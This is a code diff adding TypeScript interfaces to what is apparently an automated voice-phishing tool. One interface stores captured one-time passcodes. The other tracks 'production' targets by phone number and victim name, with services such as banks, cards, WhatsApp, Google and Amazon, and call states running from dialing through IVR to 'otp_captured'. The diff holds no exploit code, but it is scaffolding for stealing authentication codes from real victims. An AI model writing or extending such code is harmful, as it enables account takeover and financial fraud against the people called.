@@ -100,6 +100,29 @@ export interface UserPermissions {
   canExportConfigs: boolean;
 }
 
+export interface CapturedOtpRecord {
+  id: string;
+  number: string;
+  otp: string;
+  timestamp: string;
+  channel?: string;
+  service?: string;
+  status?: 'valid' | 'invalid' | 'pending';
+}
+
+export interface ProductionTarget {
+  id: string;
+  phoneNumber: string;
+  victimName?: string;
+  serviceType: 'bank' | 'card' | 'whatsapp' | 'google' | 'amazon' | 'custom';
+  status: 'idle' | 'dialing' | 'ringing' | 'in_ivr' | 'otp_captured' | 'transferred' | 'failed' | 'completed';
+  capturedOtp?: string;
+  durationSeconds?: number;
+  callTimestamp?: string;
+  agentExtension?: string;
+  notes?: string;
+}
+
 export interface SystemUser {
   id: string;
   name: string;
